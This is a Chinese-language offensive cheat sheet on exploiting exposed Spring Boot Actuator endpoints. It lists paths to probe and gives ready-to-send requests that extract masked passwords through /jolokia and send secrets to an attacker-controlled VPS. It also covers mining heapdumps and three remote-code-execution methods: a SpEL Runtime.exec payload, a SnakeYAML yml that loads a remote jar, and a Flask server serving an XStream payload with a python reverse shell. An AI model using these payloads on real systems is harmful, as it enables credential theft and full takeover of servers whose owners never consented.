# SpringBootActuator

## 判断SpringBoot
1. 错误信息
![](https://gitee.com/ryuzusunc/archives/raw/master/img/SpringBoot.png)

>https://github.com/LandGrey/SpringBootVulExploit
## 路由
### 有关路由
- 有些程序员会自定义 /manage、/management 、项目 App 相关名称为 spring 根路径
- Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径
- Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv

## 信息泄露
### 路由地址及接口调用详情泄露
swagger 相关路由：

```
/v2/api-docs
/swagger-ui.html
```

其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：

```
/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```

除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：

```
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
```

### 配置不当而暴露的路由

```
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
```

>http://www.ityouknow.com/springboot/2018/02/06/spring-boot-actuator.html
#### Actuator 监控

Spring Boot 使用“习惯优于配置的理念”，采用包扫描和自动化配置的机制来加载依赖 Jar 中的 Spring bean，不需要任何 Xml 配置，就可以实现 Spring 的所有配置。虽然这样做能让我们的代码变得非常简洁，但是整个应用的实例创建和依赖关系等信息都被离散到了各个配置类的注解上，这使得我们分析整个应用中资源和实例的各种关系变得非常的困难。

Actuator 是 Spring Boot 提供的对应用系统的自省和监控的集成功能，可以查看应用配置的详细信息，例如自动化配置信息、创建的 Spring beans 以及一些环境属性等。

为了保证 actuator 暴露的监控接口的安全性，需要添加安全控制的依赖spring-boot-start-security依赖，访问应用监控端点时，都需要输入验证信息。Security 依赖，可以选择不加，不进行安全管理，但不建议这么做。

#### Actuator 的 REST 接口

Actuator 监控分成两类：原生端点和用户自定义端点；自定义端点主要是指扩展性，用户可以根据自己的实际应用，定义一些比较关心的指标，在运行期进行监控。

原生端点是在应用程序里提供众多 Web 接口，通过它们了解应用程序运行时的内部状况。原生端点又可以分成三类：

- 应用配置类：可以查看应用在运行期的静态信息：例如自动配置信息、加载的 springbean 信息、yml 文件配置信息、环境信息、请求映射信息；
- 度量指标类：主要是运行期的动态信息，例如堆栈、请求连接、一些健康指标、metrics 信息等；
- 操作控制类：主要是指 shutdown,用户可以发送一个请求将应用的监控功能关闭。

Actuator 提供了 13 个接口

- GET	/auditevents	
  - 显示应用暴露的审计事件 (比如认证进入、订单失败)
- GET	/beans	
  - 描述应用程序上下文里全部的 Bean，以及它们的关系
- GET	/conditions	
  - 就是 1.0 的 /autoconfig ，提供一份自动配置生效的条件情况，记录哪些自动配置条件通过了，哪些没通过
- GET	/configprops	
  - 描述配置属性(包含默认值)如何注入Bean
- GET	/env	
  - 获取全部环境属性
- GET	/env/{name}	
  - 根据名称获取特定的环境属性值
- GET	/flyway	
  - 提供一份 Flyway 数据库迁移信息
- GET	/liquidbase	
  - 显示Liquibase 数据库迁移的纤细信息
- GET	/health	
  - 报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供
- GET	/heapdump	
  - dump 一份应用的 JVM 堆信息
- GET	/httptrace	
  - 显示HTTP足迹，最近100个HTTP request/repsponse
- GET	/info	
  - 获取应用程序的定制信息，这些信息由info打头的属性提供
- GET	/logfile	
  - 返回log file中的内容(如果 logging.file 或者 logging.path 被设置)
- GET	/loggers	
  - 显示和修改配置的loggers
- GET	/metrics	
  - 报告各种应用程序度量信息，比如内存用量和HTTP请求计数
- GET	/metrics/{name}	
  - 报告指定名称的应用程序度量值
- GET	/scheduledtasks	
  - 展示应用中的定时任务信息
- GET	/sessions	
  - 如果我们使用了 Spring Session 展示应用中的 HTTP sessions 信息
- POST	/shutdown	
  - 关闭应用程序，要求endpoints.shutdown.enabled设置为true
- GET	/mappings	
  - 描述全部的 URI路径，以及它们和控制器(包含Actuator端点)的映射关系
- GET	/threaddump	
  - 获取线程活动的快照

**重点关注**:

- /env、/actuator/env

GET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；

同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。

- /refresh、/actuator/refresh

POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。

- /restart、/actuator/restart

暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。

- /jolokia、/actuator/jolokia

可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。

- /trace、/actuator/httptrace

一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。

## 获取脱敏信息
访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果

### jolokia获取脱敏信息

**利用条件**

- 目标网站存在 /jolokia 或 /actuator/jolokia 接口
- 目标使用了 jolokia-core 依赖（版本要求暂未知）

**利用方法**

1. 找到想要获取的属性名

GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。

2. jolokia 调用相关 Mbean 获取明文

将下面示例中的 `security.user.password` 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 `value` 键中。

- 调用 `org.springframework.boot` Mbean

>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法

spring 1.x
```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x
```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

- 调用 `org.springframework.cloud.context.environment` Mbean

>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法

spring 1.x
```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x
```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

- 调用其他 Mbean

>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。

![](https://gitee.com/ryuzusunc/archives/raw/master/img/jolokia获取脱敏信息.png)

### netflix-eureka-client获取脱敏信息

**利用条件**

- 可以 GET 请求目标网站的 /env
- 可以 POST 请求目标网站的 /env
- 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）
- 目标使用了 spring-cloud-starter-netflix-eureka-client 依赖
- 目标可以请求攻击者的服务器（请求可出外网）

**利用方法**

1. 找到想要获取的属性名

GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。

2. NC监听HTTP请求

在自己控制的外网服务器上监听 80 端口：

```
nc -lvk 80
```

3. 设置 eureka.client.serviceUrl.defaultZone 属性

将下面 [http://value:${security.user.password}@your-vps-ip] 中的 `security.user.password` 换成自己想要获取的对应的星号 `*` 遮掩的属性名；

`your-vps-ip` 换成自己外网服务器的真实 ip 地址。

spring 1.x
```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
```

spring 2.x
```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
```

4. 刷新配置

spring 1.x
```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x
```
POST /actuator/refresh
Content-Type: application/json
```

5. 解码属性值

正常的话， nc 监听的服务器会收到目标发来的请求，其中包含类似如下 `Authorization` 头内容：

```
Authorization: Basic dmFsdWU6MTIzNDU2
```

将其中的 dmFsdWU6MTIzNDU2 部分使用 base64 解码，即可获得类似明文值 value:123456 ，其中的 123456 即是目标星号 * 脱敏前的属性值明文。

![](https://gitee.com/ryuzusunc/archives/raw/master/img/netflix-eureka-client获取脱敏信息.png)

### 设置属性获取脱敏信息

**利用条件**

- 通过 POST /env 设置属性触发目标对外网指定地址发起任意 http 请求
- 目标可以请求攻击者的服务器（请求可出外网）

**利用方法**

1. 找到想要获取的属性名

GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。

2. NC监听HTTP请求 

在自己控制的外网服务器上监听 80 端口：

```
nc -lvk 80
```

3. 触发对外HTTP请求

- spring.cloud.bootstrap.location 方法（**同时适用**于明文数据中有特殊 url 字符的情况）

spring 1.x
```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
```

spring 2.x
```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}
```

- eureka.client.serviceUrl.defaultZone 方法（**不适用**于明文数据中有特殊 url 字符的情况）

spring 1.x
```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}

```

spring 2.x
```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
```

4. 刷新配置

spring 1.x
```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x
```
POST /actuator/refresh
Content-Type: application/json
```

![](https://gitee.com/ryuzusunc/archives/raw/master/img/设置属性获取脱敏信息.png)

### 分析内存获取脱敏信息

**利用条件**

- 可正常 GET 请求目标 /heapdump 或 /actuator/heapdump 接口

**利用方法**

1. 找到想要获取的属性名

GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。

1. 下载 jvm heap 信息
>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G

GET 请求目标的 /heapdump 或 /actuator/heapdump 接口，下载应用实时的 JVM 堆信息

3. 使用 [MAT](https://www.eclipse.org/downloads/download.php?file=/mat/1.11.0/rcp/MemoryAnalyzer-1.11.0.20201202-win32.win32.x86_64.zip) 工具分析并获得 jvm heap中的密码明文

由于 Value 存储在 Hashtable 与 LinkedHashMap 中,可以使用 OQL 语句辅助分析

```
select * from org.springframework.web.context.support.StandardServletEnvironment //所有Spring相关

select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password")) //名字为password的Hashtable

select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password")) //名字为password的LinkedHashMap
```

![](https://gitee.com/ryuzusunc/archives/raw/master/img/分析内存获取脱敏信息.png)

## 远程代码执行
### whitelabel error page SpEL RCE

**利用条件**

- spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0
- 至少知道一个触发 springboot 默认错误页面的接口及参数名

**利用方法**

1. 找到一个正常传参处

比如发现访问 /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。

2. 执行SpEL表达式

输入 /article?id=${7*7} ，如果发现报错页面将 `7*7` 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。

将要执行的命令字符串格式转换成 `0x**` 的十六进制 JAVA 字节形式，方便执行任意代码，可以使用工具，如[BerylEnigma](https://github.com/ffffffff0x/BerylEnigma)，也可以自行编写脚本完成

例：
```
calc  --->  0x63,0x61,0x6C,0x63

${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6C,0x63}))}
```

![](https://gitee.com/ryuzusunc/archives/raw/master/img/SpringEL%E8%A1%A8%E8%BE%BE%E5%BC%8FRCE.png)

**漏洞原理**
- spring boot 处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类中
- 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析
- 其中 ${} 包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞

### spring cloud SnakeYAML RCE

**利用条件**

- 可以 POST 请求目标网站的 /env 接口设置属性
- 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）
- 目标依赖的 spring-cloud-starter 版本 < 1.3.0.RELEASE
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

1. 托管yml和jar文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```

在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下：

```yml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-vps-ip/example.jar"]
  ]]
]
```

在网站根目录下放置后缀为 jar 的文件 example.jar，内容是要执行的代码，代码编写及编译方式参考 [yaml-payload](https://github.com/artsploit/yaml-payload)。

2. 设置 spring.cloud.bootstrap.location 属性

spring 1.x
```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
```

spring 2.x
```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
```

3. 刷新配置

spring 1.x
```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x
```
POST /actuator/refresh
Content-Type: application/json
```

![](https://gitee.com/ryuzusunc/archives/raw/master/img/springCloudSnakeYAMLRCE.png)

**漏洞原理**

- spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址
- refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容
- SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作
- 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件
- 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化
- 实例化类时执行恶意代码，造成 RCE 漏洞

### eureka xstream deserialization RCE

**利用条件**

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
- 目标使用的  `eureka-client` < 1.8.7（通常包含在 `spring-cloud-starter-netflix-eureka-client` 依赖中）
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

1. 架设响应恶意 XStream payload 的网站

提供一个依赖 Flask 并符合要求的 [python 脚本示例](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py)，作用是利用目标 Linux 机器上自带的 python 来反弹shell。

使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。

```python
#!/usr/bin/env python
# coding: utf-8
# -**- Author: LandGrey -**-

from flask import Flask, Response

app = Flask(__name__)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                       <string>/bin/bash</string>
                       <string>-c</string>
                       <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.203.128",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
    return Response(xml, mimetype='application/xml')


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=4433)
```

3. 设置 eureka.client.serviceUrl.defaultZone 属性

spring 1.x
```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
```

spring 2.x
```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
```

4. 刷新配置

spring 1.x
```
POST /refresh
Content-Type: application/x-www-form-urlencoded
```

spring 2.x
```
POST /actuator/refresh
Content-Type: application/json
```

**漏洞原理**
- eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址
- refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload
- 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞


# 备注
[SpringBootVulExploit]